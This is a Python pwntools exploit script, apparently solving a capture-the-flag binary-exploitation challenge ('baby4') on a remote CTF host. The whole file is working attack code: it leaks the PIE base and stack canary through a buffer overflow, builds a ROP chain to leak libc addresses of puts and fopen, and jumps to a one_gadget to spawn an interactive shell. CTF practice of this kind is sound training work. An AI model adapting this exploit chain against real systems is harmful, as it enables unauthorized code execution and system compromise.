from pwn import *

#p = process("./baby4")

p = remote("baby-01.pwn.beer", 10004)

#gdb.attach(p, '''
#    b *$rebase(0xcf2)
#''')


# leak pie, ld-slide
p.sendline("A"*(8*3))
p.recvuntil("--> ")

pie = u64(p.recvline()[24:][0:6].ljust(8,"\x00")) - 0xd5d


# leak stack canary
buf = "A"*72
buf += "B"

p.sendline(buf)
p.recvuntil("--> ")

a = p.recvline().split("B")[1]

canary = u64("\x00" + a[0:7])

print hex(canary)

#0x0000000000000d73: pop rdi; ret;
pop_rdi_ret = p64(pie + 0x0000000000000d73)

buf = ""
buf = "A"*72
buf += p64(canary)

buf += "B"*8
buf += pop_rdi_ret
buf += p64(pie + 0x201f88) # leak puts
buf += p64(pie + 0x00840)

buf += pop_rdi_ret
buf += p64(pie + 0x201fc8) # leak fopen
buf += p64(pie + 0x00840)

buf += p64(pie + 0x8f0) #jmp back to main

p.sendline(buf)
p.sendline()
p.recvuntil("<-- ")
p.recvuntil("<-- ")

# https://libc.blukat.me/?q=fopen%3Ae30%2Cputs%3A9c0&l=libc6_2.27-3ubuntu1_amd64
putsc = u64(p.recvline()[:-1][0:6].ljust(8, "\x00"))
print "puts", hex(putsc)

fopenc = u64(p.recvline()[:-1][0:6].ljust(8, "\x00"))
print "fopen", hex(fopenc)

one_gadget = putsc - 0x0809c0 + 0x4f322

buf = ""
buf = "A"*72
buf += p64(canary)

buf += "B"*8
buf += p64(one_gadget)

p.sendline(buf)
p.sendline()

p.interactive()
